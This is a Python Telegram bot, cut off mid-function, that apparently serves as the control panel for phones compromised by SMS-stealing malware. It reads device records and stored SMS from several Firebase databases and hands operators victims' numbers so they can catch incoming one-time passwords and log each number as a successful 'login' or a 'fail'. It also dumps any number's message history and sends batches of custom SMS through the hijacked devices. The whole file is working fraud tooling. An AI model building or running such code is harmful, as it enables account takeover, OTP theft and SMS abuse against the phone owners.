import os
import re
import time
import html
import asyncio
import aiohttp
import logging
import random
from datetime import datetime, timezone, timedelta
from aiohttp import web

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# --- Configuration & Environment Variables ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))

MY_DB_URL = os.environ.get("MY_DB_URL", "").strip().rstrip('/')

ACCESS_USERS_STR = os.environ.get("ACCESS_USERS", "")
ACCESS_USERS = [int(x.strip()) for x in ACCESS_USERS_STR.split(",") if x.strip().lstrip('-').isdigit()]
if ADMIN_CHAT_ID != 0 and ADMIN_CHAT_ID not in ACCESS_USERS:
    ACCESS_USERS.append(ADMIN_CHAT_ID)

FB_URLS_STR = os.environ.get("FIREBASE_URLS", "")
FIREBASE_URLS = list(dict.fromkeys([url.strip().rstrip('/') for url in FB_URLS_STR.split(",") if url.strip()]))

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.WARNING)

# Conversation States
ASK_TARGET_NUMBER = 1
ASK_MESSAGE_TEXT = 2
ASK_QUANTITY = 3
ASK_SPECIFIC_NUMBER = 4
ADMIN_WAIT_PAYLOAD = 5
ASK_PROJECT_NAME = 6

# Global Trackers & Locks
BLOCKED_USERS = set()
active_otp_sessions = {}
active_send_tasks = {}
user_action_locks = {}

# Strict Deduplication Trackers
global_seen_ids = set()
global_seen_content = {}

# Shared HTTP Session
http_session: aiohttp.ClientSession = None


# --- AIOHTTP Web Server ---
async def health_check(request):
    return web.Response(text="Bot is running and healthy!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port} for UptimeRobot.")


# --- HTTP + Firebase helpers ---
async def get_http_session() -> aiohttp.ClientSession:
    global http_session
    if http_session is None or http_session.closed:
        connector = aiohttp.TCPConnector(limit=150, ttl_dns_cache=300)
        http_session = aiohttp.ClientSession(connector=connector)
    return http_session

async def fetch_json(url, timeout_secs=8):
    session = await get_http_session()
    try:
        async with session.get(f"{url}.json", timeout=timeout_secs) as response:
            if response.status == 200:
                return await response.json()
    except Exception:
        pass
    return None

async def put_json(url, payload, timeout_secs=5):
    session = await get_http_session()
    try:
        async with session.put(f"{url}.json", json=payload, timeout=timeout_secs) as response:
            return response.status == 200
    except Exception:
        pass
    return False

async def post_json(url, payload, timeout_secs=5):
    session = await get_http_session()
    try:
        async with session.post(f"{url}.json", json=payload, timeout=timeout_secs) as response:
            return response.status == 200
    except Exception:
        pass
    return False

async def delete_json(url, timeout_secs=5):
    session = await get_http_session()
    try:
        async with session.delete(f"{url}.json", timeout=timeout_secs) as response:
            return response.status == 200
    except Exception:
        pass
    return False


async def log_action_to_firebase(user_id, user_name, action, details=""):
    if not MY_DB_URL: return
    ist_tz = timezone(timedelta(hours=5, minutes=30))
    payload = {
        "timestamp": int(time.time() * 1000),
        "date_time": datetime.now(ist_tz).strftime('%Y-%m-%d %H:%M:%S'),
        "user_id": user_id,
        "user_name": user_name,
        "action": action,
        "details": details
    }
    asyncio.create_task(post_json(f"{MY_DB_URL}/bot_logs", payload))

async def save_user_to_db(user):
    if not MY_DB_URL: return
    payload = {
        "chat_id": user.id,
        "full_name": user.full_name,
        "username": user.username or "N/A",
        "last_active": int(time.time() * 1000)
    }
    await put_json(f"{MY_DB_URL}/users/{user.id}", payload)


# --- Data Normalization ---
def clean_mobile_number(raw_num):
    if not raw_num: return None
    digits = re.sub(r'\D', '', str(raw_num))
    if len(digits) == 12 and digits.startswith('91'): digits = digits[2:]
    elif len(digits) == 11 and digits.startswith('0'): digits = digits[1:]
    if len(digits) == 10 and digits[0] in '6789': return digits
    return None

def extract_client_number(client_data):
    if not isinstance(client_data, dict): return None
    for key in ('mobNo', 'mobile', 'phoneNumber', 'number', 'sim1'):
        num = clean_mobile_number(client_data.get(key))
        if num: return num
    sims = client_data.get('sims')
    if isinstance(sims, list):
        for sim in sims:
            if isinstance(sim, dict):
                num = clean_mobile_number(sim.get('phoneNumber') or sim.get('mobNo') or sim.get('number'))
                if num: return num
    elif isinstance(sims, dict):
        for sim in sims.values():
            if isinstance(sim, dict):
                num = clean_mobile_number(sim.get('phoneNumber') or sim.get('mobNo') or sim.get('number'))
                if num: return num
    return None

def get_latest_timestamp(client_data, device_ping_data=None):
    timestamps = [0]
    if isinstance(client_data, dict):
        ping_obj = client_data.get('ping')
        if isinstance(ping_obj, dict):
            ts = ping_obj.get('ts') or ping_obj.get('timestamp', 0)
            if str(ts).isdigit(): timestamps.append(int(ts))
        elif str(ping_obj).isdigit(): timestamps.append(int(ping_obj))

        hb_obj = client_data.get('heartbeat')
        if isinstance(hb_obj, dict):
            ts = hb_obj.get('timestamp') or hb_obj.get('ts', 0)
            if str(ts).isdigit(): timestamps.append(int(ts))
        
        joined = client_data.get('joined', 0)
        if str(joined).isdigit(): timestamps.append(int(joined))

    if isinstance(device_ping_data, dict):
        p_obj = device_ping_data.get('ping', {})
        if isinstance(p_obj, dict):
            ts = p_obj.get('ts', 0)
            if str(ts).isdigit(): timestamps.append(int(ts))

    max_ts = max(timestamps)
    if 1_000_000_000 < max_ts < 10_000_000_000: max_ts *= 1000
    if max_ts == 0 and isinstance(client_data, dict):
        status = client_data.get('status')
        if status is True or str(status).lower() in ('online', 'true', 'active', '1'):
            max_ts = int((time.time() - 900) * 1000)
    return max_ts

def parse_messages(raw_data):
    msgs = []
    if isinstance(raw_data, dict):
        for k, v in raw_data.items():
            if isinstance(v, dict): msgs.append((str(k), v))
    elif isinstance(raw_data, list):
        for i, v in enumerate(raw_data):
            if isinstance(v, dict): msgs.append((str(i), v))
    return msgs

def is_incoming_sms(msg_dict):
    msg_type = str(msg_dict.get('type', 'incoming')).lower().strip()
    if msg_type in ('outgoing', 'sent', 'out', '2'): return False
    if 'isSended' in msg_dict or '_wake' in msg_dict: return False
    return True

def is_duplicate_sms(fb_url, dev_id, fb_key, msg_dict, record_only=False):
    inner_id = str(msg_dict.get('id', '')).strip()
    key_id = str(fb_key).strip()
    uid_key = f"{fb_url}_{dev_id}_k_{key_id}"
    uid_inner = f"{fb_url}_{dev_id}_i_{inner_id}" if inner_id else uid_key
    sender = str(msg_dict.get('sender', 'Unknown')).strip().upper()
    text = re.sub(r'\s+', ' ', str(msg_dict.get('message', '')).strip())
    content_sig = f"{dev_id}_{sender}_{text}"
    now = time.time()

    if record_only:
        global_seen_ids.add(uid_key)
        global_seen_ids.add(uid_inner)
        if text: global_seen_content[content_sig] = now
        return True

    if uid_key in global_seen_ids or uid_inner in global_seen_ids: return True
    if text and content_sig in global_seen_content:
        if now - global_seen_content[content_sig] < 60:
            global_seen_ids.add(uid_key)
            global_seen_ids.add(uid_inner)
            return True

    global_seen_ids.add(uid_key)
    global_seen_ids.add(uid_inner)
    if text: global_seen_content[content_sig] = now

    if len(global_seen_content) > 5000:
        cutoff = now - 120
        for k in [k for k, ts in global_seen_content.items() if ts < cutoff]:
            global_seen_content.pop(k, None)
    return False


# --- Auth & UI Helpers ---
def is_authorized(user_id):
    return user_id in ACCESS_USERS and user_id not in BLOCKED_USERS

def is_admin(user_id):
    return ADMIN_CHAT_ID != 0 and user_id == ADMIN_CHAT_ID

def cancel_user_otp_task(user_id):
    session = active_otp_sessions.pop(user_id, None)
    if session and session.get("task"): session["task"].cancel()

def cancel_user_send_task(user_id):
    session = active_send_tasks.pop(user_id, None)
    if session and session.get("task"): session["task"].cancel()

async def notify_admin(context, message):
    if ADMIN_CHAT_ID:
        try:
            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"🛡️ <b>[ADMIN NOTIFY]</b>\n{message}", parse_mode="HTML")
        except Exception:
            pass

async def notify_admin_user_start(context, user):
    if not is_admin(user.id) and ADMIN_CHAT_ID:
        profile_text = f"🆕 <b>User Started Bot</b>\n\n<b>Name:</b> {html.escape(user.full_name)}\n<b>Username:</b> @{user.username}\n<b>ID:</b> <code>{user.id}</code>"
        try:
            photos = await context.bot.get_user_profile_photos(user.id)
            if photos.total_count > 0:
                photo_id = photos.photos[0][-1].file_id
                await context.bot.send_photo(chat_id=ADMIN_CHAT_ID, photo=photo_id, caption=f"🛡️ <b>[ADMIN NOTIFY]</b>\n{profile_text}", parse_mode="HTML")
            else:
                await notify_admin(context, profile_text)
        except Exception:
            await notify_admin(context, profile_text)

def get_cancel_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("Cancel ❌", callback_data="cancel_action")]])

async def show_projects_menu(update, context):
    user = update.effective_user
    projects = await fetch_json(f"{MY_DB_URL}/projects") or {}
    
    kb = []
    if projects:
        for p_name in projects.keys():
            kb.append([InlineKeyboardButton(f"📁 {p_name}", callback_data=f"prj_{p_name}")])
            
    if is_admin(user.id):
        kb.append([InlineKeyboardButton("➕ Create Project", callback_data="create_project")])
    elif not projects:
        text = "No projects available right now.\n<b>Please wait for the Admin to create one.</b>"
        if update.callback_query:
            await update.callback_query.edit_message_text(text, parse_mode="HTML")
        else:
            await update.message.reply_text(text, parse_mode="HTML")
        return

    text = "📂 <b>Select a Project to continue:</b>"
    if update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
    else:
        await update.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

def get_main_menu(project_name):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🟢 Active: {project_name}", callback_data="none")],
        [InlineKeyboardButton("Get OTP 📩", callback_data="get_otp")],
        [InlineKeyboardButton("Get Msg on Specific No. 🎯", callback_data="get_specific_no")],
        [InlineKeyboardButton("Send Message 📤", callback_data="send_message")],
        [InlineKeyboardButton("🔙 Back to Projects", callback_data="back_to_projects")]
    ])


# --- General Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_authorized(user.id): return
    
    await save_user_to_db(user)
    if "has_started" not in context.user_data:
        await notify_admin_user_start(context, user)
        context.user_data["has_started"] = True
        await log_action_to_firebase(user.id, user.first_name, "STARTED_BOT")
        
    await show_projects_menu(update, context)

async def cancel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    cancel_user_otp_task(user_id)
    cancel_user_send_task(user_id)
    
    proj = context.user_data.get('current_project')
    if proj:
        await query.edit_message_text("Action Cancelled 🛑", reply_markup=get_main_menu(proj))
    else:
        await show_projects_menu(update, context)
    return ConversationHandler.END

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    cancel_user_otp_task(user_id)
    cancel_user_send_task(user_id)
    
    proj = context.user_data.get('current_project')
    if proj:
        await update.message.reply_text("Action Cancelled 🛑", reply_markup=get_main_menu(proj))
    else:
        await show_projects_menu(update, context)
    return ConversationHandler.END


# --- Admin Commands & Project Creation ---
async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    help_text = (
        "🛠️ <b>Admin Commands Panel</b>\n\n"
        "<code>/start</code> - Start Bot & Show Projects\n"
        "<code>/help</code> - Show this menu\n"
        "<code>/track &lt;project&gt;</code> - View all login/fail marks for a project\n"
        "<code>/editmark &lt;project&gt; &lt;number&gt; &lt;login|fail|clear&gt;</code> - Modify or remove a number mark\n"
        "<code>/block &lt;chat_id&gt;</code> - Block a user\n"
        "<code>/release &lt;chat_id&gt;</code> - Unblock a user\n"
        "<code>/cancelsend &lt;chat_id&gt;</code> - Stop user's message sending\n"
        "<code>/send &lt;chat_id&gt;</code> - Forward a custom message to user\n"
    )
    await update.message.reply_text(help_text, parse_mode="HTML")

async def cmd_track(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not context.args:
        await update.message.reply_text("Usage: `/track <ProjectName>`", parse_mode="Markdown")
        return
    proj = context.args[0]
    marks = await fetch_json(f"{MY_DB_URL}/projects_data/{proj}/marks") or {}
    if not marks:
        await update.message.reply_text(f"No records found for project: <b>{proj}</b>", parse_mode="HTML")
        return
    
    lines = [f"📊 <b>Stats for {proj}</b>\n"]
    for num, data in marks.items():
        st = data.get('status', 'Unknown').upper()
        by = data.get('marked_by_name', 'Unknown')
        lines.append(f"• <code>{num}</code> - {st} (by {by})")
        
    text = "\n".join(lines)
    if len(text) > 4000: text = text[:4000] + "\n...truncated"
    await update.message.reply_text(text, parse_mode="HTML")

async def cmd_editmark(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        proj = context.args[0]
        num = clean_mobile_number(context.args[1])
        action = context.args[2].lower()
        if action not in ['login', 'fail', 'clear']: raise ValueError
    except Exception:
        await update.message.reply_text("Usage: `/editmark <project> <number> <login|fail|clear>`", parse_mode="Markdown")
        return

    path = f"{MY_DB_URL}/projects_data/{proj}/marks/{num}"
    if action == 'clear':
        ok = await delete_json(path)
        await update.message.reply_text(f"✅ Mark cleared for <code>{num}</code> in <b>{proj}</b>.", parse_mode="HTML")
    else:
        payload = {
            "status": action,
            "marked_by": ADMIN_CHAT_ID,
            "marked_by_name": "Admin (Edited)",
            "timestamp": int(time.time() * 1000)
        }
        ok = await put_json(path, payload)
        await update.message.reply_text(f"✅ Number <code>{num}</code> set to {action.upper()} in <b>{proj}</b>.", parse_mode="HTML")


async def ask_project_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not is_admin(query.from_user.id): return ConversationHandler.END
    await query.answer()
    await query.edit_message_text("Enter the new <b>Project Name</b> (Alphanumeric only):", parse_mode="HTML", reply_markup=get_cancel_keyboard())
    return ASK_PROJECT_NAME

async def save_project(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return ConversationHandler.END
    raw_name = update.message.text.strip()
    safe_name = re.sub(r'[^a-zA-Z0-9_]', '', raw_name)
    
    if not safe_name:
        await update.message.reply_text("Invalid name. Letters and numbers only.", reply_markup=get_cancel_keyboard())
        return ASK_PROJECT_NAME
    
    await put_json(f"{MY_DB_URL}/projects/{safe_name}", {
        "created_at": int(time.time()*1000),
        "created_by": update.effective_user.id
    })
    await log_action_to_firebase(ADMIN_CHAT_ID, "Admin", "CREATED_PROJECT", f"Project: {safe_name}")
    await update.message.reply_text(f"✅ Project <b>{safe_name}</b> created successfully!", parse_mode="HTML")
    await show_projects_menu(update, context)
    return ConversationHandler.END


# --- Core OTP Workflow ---
async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_new=False):
    query = update.callback_query
    user = query.from_user
    proj = context.user_data.get('current_project')
    if not proj:
        await query.answer("No project selected!", show_alert=True)
        return

    lock = user_action_locks.setdefault(user.id, asyncio.Lock())
    if lock.locked(): return

    status_message = None
    async def show_status(text, kb=None):
        nonlocal status_message
        try:
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
            status_message = query.message
        except Exception:
            pass

    async with lock:
        cancel_user_otp_task(user.id)
        await show_status(f"Searching active databases for project <b>{proj}</b>... ⏳")
        await log_action_to_firebase(user.id, user.first_name, "SEARCHING_OTP", f"Project: {proj}")

        marks = await fetch_json(f"{MY_DB_URL}/projects_data/{proj}/marks") or {}
        allocated = await fetch_json(f"{MY_DB_URL}/projects_data/{proj}/allocated") or {}

        # Exclude numbers marked fail/login for THIS project
        failed_set = {n for n, v in marks.items() if v.get('status') in ('fail', 'login')}
        # Exclude numbers allocated to OTHER users for THIS project
        allocated_to_others = {n for n, v in allocated.items() if v.get('user_id') != user.id}
        
        exclude_set = failed_set.union(allocated_to_others)

        fetch_tasks = [fetch_json(f"{fb_url}/clients") for fb_url in FIREBASE_URLS]
        results = await asyncio.gather(*fetch_tasks)
        now_ms = int(time.time() * 1000)

        all_active_devices = []
        seen_numbers = set()

        time_window = 10
        while time_window <= 1440:
            cutoff_ms = now_ms - (time_window * 60 * 1000)
            for fb_url, clients_data in zip(FIREBASE_URLS, results):
                if not clients_data or not isinstance(clients_data, dict): continue
                for dev_id, client in clients_data.items():
                    ts = get_latest_timestamp(client)
                    if ts < cutoff_ms: continue
                    valid_num = extract_client_number(client)
                    if not valid_num or valid_num in exclude_set or valid_num in seen_numbers: continue
                    seen_numbers.add(valid_num)
                    all_active_devices.append({'fb_url': fb_url, 'dev_id': dev_id, 'num': valid_num, 'ts': ts})
            if all_active_devices: break
            time_window += 30

        if not all_active_devices:
            await show_status("❌ No active, unallocated numbers found for this project.", kb=get_main_menu(proj))
            return

        all_active_devices.sort(key=lambda x: x['ts'], reverse=True)
        previously_used = context.user_data.get('used_numbers', set())
        selected = None

        if is_new:
            for device in all_active_devices:
                if device['num'] not in previously_used:
                    selected = device
                    break
            if not selected:
                previously_used.clear()
                selected = random.choice(all_active_devices[:min(5, len(all_active_devices))])
        else:
            selected = all_active_devices[0]

        context.user_data.setdefault('used_numbers', set()).add(selected['num'])
        num = selected['num']

        # Allocate to this user for this project
        await put_json(f"{MY_DB_URL}/projects_data/{proj}/allocated/{num}", {
            "user_id": user.id, "timestamp": now_ms
        })

        action = "Requested New Number" if is_new else "Requested OTP"
        await log_action_to_firebase(user.id, user.first_name, action, f"Number: {num} | Project: {proj}")
        await notify_admin(context, f"User <b>{html.escape(user.first_name)}</b> {action}: <code>{num}</code>\nProject: <b>{proj}</b>")

        kb = [
            [InlineKeyboardButton("Get New Number 🔄", callback_data="get_new_number")],
            [
                InlineKeyboardButton("Login ✅", callback_data=f"mark_login_{num}"),
                InlineKeyboardButton("Fail ❌", callback_data=f"mark_fail_{num}")
            ],
            [InlineKeyboardButton("Cancel Number ❌", callback_data="cancel_number")]
        ]

        await show_status(
            f"✅ <b>Number Found:</b> <code>{num}</code>\n"
            f"📁 <b>Project:</b> {proj}\n"
            f"Status: <b>Valid for 5 Minutes</b> ⏱️\n"
            f"Send your SMS. New messages will appear here.",
            kb=InlineKeyboardMarkup(kb)
        )

        session_id = int(time.time() * 1000)
        task = asyncio.create_task(monitor_otp(context, user.id, query.message.chat_id, selected['fb_url'], selected['dev_id'], num, 300, session_id, proj))
        active_otp_sessions[user.id] = {"task": task, "session_id": session_id}

async def monitor_otp(context, user_id, chat_id, fb_url, dev_id, mobile_number, duration_secs, session_id, proj):
    end_time = time.time() + duration_secs
    initial_raw = await fetch_json(f"{fb_url}/messages/{dev_id}")
    for k, m in parse_messages(initial_raw):
        is_duplicate_sms(fb_url, dev_id, k, m, record_only=True)

    try:
        while time.time() < end_time:
            curr = active_otp_sessions.get(user_id)
            if not curr or curr.get("session_id") != session_id: return

            fresh_raw = await fetch_json(f"{fb_url}/messages/{dev_id}")
            for k, m in parse_messages(fresh_raw):
                if is_incoming_sms(m) and not is_duplicate_sms(fb_url, dev_id, k, m, record_only=False):
                    sender = html.escape(str(m.get('sender', 'Unknown')))
                    text = html.escape(str(m.get('message', '')))
                    dt = html.escape(str(m.get('dateTime', 'Just Now')))
                    
                    alert = (
                        f"🔔 <b>NEW MESSAGE</b> 🔔\n\n"
                        f"<b>Project:</b> {proj}\n"
                        f"<b>To:</b> <code>{mobile_number}</code>\n"
                        f"<b>From:</b> {sender}\n"
                        f"<b>Time:</b> {dt}\n\n"
                        f"<b>Message:</b>\n<code>{text}</code>"
                    )
                    try:
                        await context.bot.send_message(chat_id=chat_id, text=alert, parse_mode="HTML")
                        await notify_admin(context, f"User <code>{user_id}</code> Received SMS on <code>{mobile_number}</code> ({proj}):\n\n{alert}")
                        await log_action_to_firebase(user_id, "User", "RECEIVED_SMS", f"Project: {proj} | To: {mobile_number} | From: {sender} | Msg: {text}")
                    except Exception as e:
                        logging.error(f"Telegram send error: {e}")
            await asyncio.sleep(2.5)

        curr = active_otp_sessions.get(user_id)
        if curr and curr.get("session_id") == session_id:
            active_otp_sessions.pop(user_id, None)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"⏰ The 5-minute window for <code>{mobile_number}</code> has expired.",
                parse_mode="HTML",
                reply_markup=get_main_menu(proj)
            )
    except asyncio.CancelledError:
        pass


# --- Mark Login / Fail (All Users) ---
async def handle_user_mark(update: Update, context: ContextTypes.DEFAULT_TYPE, status: str):
    query = update.callback_query
    user = query.from_user
    proj = context.user_data.get('current_project')
    await query.answer()

    if not proj:
        await query.edit_message_text("❌ No active project.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="back_to_projects")]]))
        return

    prefix = "mark_login_" if status == "login" else "mark_fail_"
    number = clean_mobile_number(query.data[len(prefix):].strip())
    if not number: return

    payload = {
        "status": status,
        "marked_by": user.id,
        "marked_by_name": user.first_name,
        "timestamp": int(time.time() * 1000)
    }
    
    await put_json(f"{MY_DB_URL}/projects_data/{proj}/marks/{number}", payload)
    
    label = "✅ LOGIN" if status == "login" else "❌ FAIL"
    try:
        await query.edit_message_text(
            f"{label} — Number <code>{number}</code> marked successfully for project <b>{proj}</b>.\n"
            f"It will not be shown to any user in this project again.",
            parse_mode="HTML",
            reply_markup=get_main_menu(proj)
        )
    except Exception: pass

    cancel_user_otp_task(user.id)
    await log_action_to_firebase(user.id, user.first_name, f"MARKED_{status.upper()}", f"Project: {proj} | Number: {number}")
    await notify_admin(context, f"User <b>{html.escape(user.first_name)}</b> marked <code>{number}</code> as <b>{status.upper()}</b> in Project <b>{proj}</b>.")


# --- Specific Number Flow ---
async def start_specific_no(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not is_authorized(query.from_user.id): return ConversationHandler.END
    await query.answer()
    await query.edit_message_text("Enter the 10-digit mobile number to monitor:", reply_markup=get_cancel_keyboard())
    return ASK_SPECIFIC_NUMBER

async def fetch_specific_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    proj = context.user_data.get('current_project', 'Unknown')
    target_num = clean_mobile_number(update.message.text.strip())

    if not target_num:
        await update.message.reply_text("❌ Invalid format.", reply_markup=get_cancel_keyboard())
        return ASK_SPECIFIC_NUMBER

    status_msg = await update.message.reply_text("Searching all databases... ⏳", reply_markup=get_cancel_keyboard())
    fetch_tasks = [fetch_json(f"{f}/clients") for f in FIREBASE_URLS]
    results = await asyncio.gather(*fetch_tasks)

    matching_devices = []
    for f_url, c_data in zip(FIREBASE_URLS, results):
        if not c_data or not isinstance(c_data, dict): continue
        for d_id, client in c_data.items():
            if extract_client_number(client) == target_num:
                matching_devices.append((get_latest_timestamp(client), f_url, d_id))

    if not matching_devices:
        await status_msg.edit_text(f"❌ <code>{target_num}</code> not found.", parse_mode="HTML", reply_markup=get_main_menu(proj))
        return ConversationHandler.END

    matching_devices.sort(key=lambda x: x[0], reverse=True)
    _, fb_url, dev_id = matching_devices[0]

    await notify_admin(context, f"User <b>{html.escape(user.first_name)}</b> tracking specific: <code>{target_num}</code> (Project: {proj})")
    await log_action_to_firebase(user.id, user.first_name, "TRACKED_SPECIFIC", f"Project: {proj} | Number: {target_num}")

    raw_msgs = await fetch_json(f"{fb_url}/messages/{dev_id}")
    parsed_msgs = sorted(parse_messages(raw_msgs), key=lambda x: int(x[1].get('id', x[0])) if str(x[1].get('id', x[0])).isdigit() else 0)
    
    unique_history = []
    seen = set()
    for _, m in parsed_msgs:
        if is_incoming_sms(m):
            sig = f"{m.get('sender', '')}_{m.get('message', '')}"
            if sig not in seen:
                seen.add(sig)
                unique_history.append(m)

    msg_history = f"✅ <b>Tracking:</b> <code>{target_num}</code>\n\n"
    for m in unique_history[-10:]:
        msg_history += f"[{html.escape(str(m.get('dateTime', '')))}] <b>{html.escape(str(m.get('sender', '')))}:</b> <code>{html.escape(str(m.get('message', '')))}</code>\n\n"
    
    kb = [[InlineKeyboardButton("Cancel Listening ❌", callback_data="cancel_number")]]
    await status_msg.edit_text(msg_history[:4000], parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

    cancel_user_otp_task(user.id)
    session_id = int(time.time() * 1000)
    task = asyncio.create_task(monitor_otp(context, user.id, update.message.chat_id, fb_url, dev_id, target_num, 300, session_id, proj))
    active_otp_sessions[user.id] = {"task": task, "session_id": session_id}
    return ConversationHandler.END


# --- Send Message Workflow ---
async def start_send_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Enter <b>Target Mobile Number</b>:", parse_mode="HTML", reply_markup=get_cancel_keyboard())
    return ASK_TARGET_NUMBER

async def ask_msg_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['target_number'] = update.message.text.strip()
    await update.message.reply_text("Enter the <b>Custom Message</b>:", parse_mode="HTML", reply_markup=get_cancel_keyboard())
    return ASK_MESSAGE_TEXT

async def ask_quantity(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['custom_message'] = update.message.text.strip()
    await update.message.reply_text("Enter <b>Total Quantity</b> (e.g., 10):", parse_mode="HTML", reply_markup=get_cancel_keyboard())
    return ASK_QUANTITY

async def process_sending(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    proj = context.user_data.get('current_project', 'Unknown')
    try:
        qty = int(update.message.text.strip())
        if qty <= 0: raise ValueError
    except:
        await update.message.reply_text("Invalid quantity.", reply_markup=get_main_menu(proj))
        return ConversationHandler.END

    target = context.user_data['target_number']
    msg = context.user_data['custom_message']

    kb = [[InlineKeyboardButton("Stop Sending 🛑", callback_data="stop_sending")]]
    status_msg = await update.message.reply_text("Initializing batch... 🚀", reply_markup=InlineKeyboardMarkup(kb))

    cancel_user_send_task(user.id)
    task = asyncio.create_task(run_batch_send(context, user, target, msg, qty, status_msg, proj))
    active_send_tasks[user.id] = {"task": task}
    return ConversationHandler.END

async def trigger_send_sms(fb_url, dev_id, payload):
    res1, res2 = await asyncio.gather(
        put_json(f"{fb_url}/clients/{dev_id}/webhookEvent/sendSms", payload),
        put_json(f"{fb_url}/{dev_id}/webhookEvent/sendSms", payload)
    )
    return res1 or res2

async def run_batch_send(context, user, target_number, msg_text, quantity, status_msg, proj):
    await notify_admin(context, f"User <b>{html.escape(user.first_name)}</b> sending {quantity} msgs to <code>{target_number}</code> in Project {proj}.")
    await log_action_to_firebase(user.id, user.first_name, "BATCH_SEND_STARTED", f"Target: {target_number} | Qty: {quantity}")

    results = await asyncio.gather(*[fetch_json(f"{f}/clients") for f in FIREBASE_URLS])
    now_ms = int(time.time() * 1000)
    active_devices = []

    for w_mins in (10, 30, 120, 1440):
        cutoff = now_ms - (w_mins * 60 * 1000)
        for f_url, c_data in zip(FIREBASE_URLS, results):
            if not c_data or not isinstance(c_data, dict): continue
            for d_id, client in c_data.items():
                if get_latest_timestamp(client) >= cutoff:
                    active_devices.append((f_url, d_id))
        if active_devices: break

    if not active_devices:
        await status_msg.edit_text("❌ No active devices.", reply_markup=get_main_menu(proj))
        return

    random.shuffle(active_devices)
    success, failed = 0, 0
    kb = [[InlineKeyboardButton("Stop Sending 🛑", callback_data="stop_sending")]]

    try:
        for i in range(1, quantity + 1):
            f_url, d_id = active_devices[(i - 1) % len(active_devices)]
            payload = {"to": target_number, "message": msg_text, "isSended": False, "from": 1, "_wake": True, "type": "outgoing", "_nonce": f"w_{now_ms}_{i}"}
            if await trigger_send_sms(f_url, d_id, payload): success += 1
            else: failed += 1

            if i % 3 == 0 or i == quantity:
                fill = int(15 * i / quantity)
                try: await status_msg.edit_text(f"🚀 <b>Sending...</b>\n[{'█'*fill}{'░'*(15-fill)}] {i}/{quantity}\nSuccess: {success} | Failed: {failed}", parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
                except: pass
            await asyncio.sleep(0.5)

        report = f"✅ <b>Batch Finished</b>\nTarget: <code>{target_number}</code>\nSuccess: {success} | Failed: {failed}"
        await status_msg.edit_text(report, parse_mode="HTML", reply_markup=get_main_menu(proj))
        await notify_admin(context, f"Batch complete for <b>{html.escape(user.first_name)}</b>:\n{report}")
    except asyncio.CancelledError:
        await status_msg.edit_text(f"🛑 <b>Stopped Early</b>\nSuccess: {success}", parse_mode="HTML", reply_markup=get_main_menu(proj))
    finally:
        active_send_tasks.pop(user.id, None)


# --- Callback Router ---
async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    if not is_authorized(user.id): return
    await query.answer()

    data = query.data
    if data.startswith("prj_"):
        p_name = data[4:]
        context.user_data['current_project'] = p_name
        await log_action_to_firebase(user.id, user.first_name, "SELECTED_PROJECT", f"Project: {p_name}")
        await query.edit_message_text(f"📁 <b>Project Active:</b> {p_name}\nSelect an action:", parse_mode="HTML", reply_markup=get_main_menu(p_name))
    elif data == "back_to_projects":
        context.user_data.pop('current_project', None)
        await show_projects_menu(update, context)
    elif data == "get_otp":
        await handle_get_otp(update, context, is_new=False)
    elif data == "get_new_number":
        await handle_get_otp(update, context, is_new=True)
    elif data == "cancel_number":
        cancel_user_otp_task(user.id)
        proj = context.user_data.get('current_project', '')
        try: await query.edit_message_text("🛑 OTP monitoring cancelled.", reply_markup=get_main_menu(proj))
        except: pass
    elif data == "stop_sending":
        cancel_user_send_task(user.id)
    elif data.startswith("mark_login_"):
        await handle_user_mark(update, context, "login")
    elif data.startswith("mark_fail_"):
        await handle_user_mark(update, context, "fail")


# --- Admin Send File Workflow ---
async def cmd_admin_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return ConversationHandler.END
    try:
        target_id = int(context.args[0])
        context.user_data['admin_target_chat'] = target_id
